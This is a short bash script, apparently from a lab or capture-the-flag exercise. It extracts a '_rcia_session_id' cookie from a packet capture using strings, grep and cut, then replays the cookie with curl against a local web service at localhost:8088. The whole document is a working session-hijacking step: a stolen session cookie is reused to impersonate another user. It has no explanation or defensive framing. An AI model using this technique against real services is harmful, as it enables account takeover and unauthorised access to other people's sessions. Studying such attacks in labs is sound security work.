#!/bin/bash

HOST="localhost:8088"

curl $HOST --cookie "_rcia_session_id=$(strings dump_enp0s31b0y7.pcap | grep _rcia | head -n 1 | cut -d"=" -f4)"
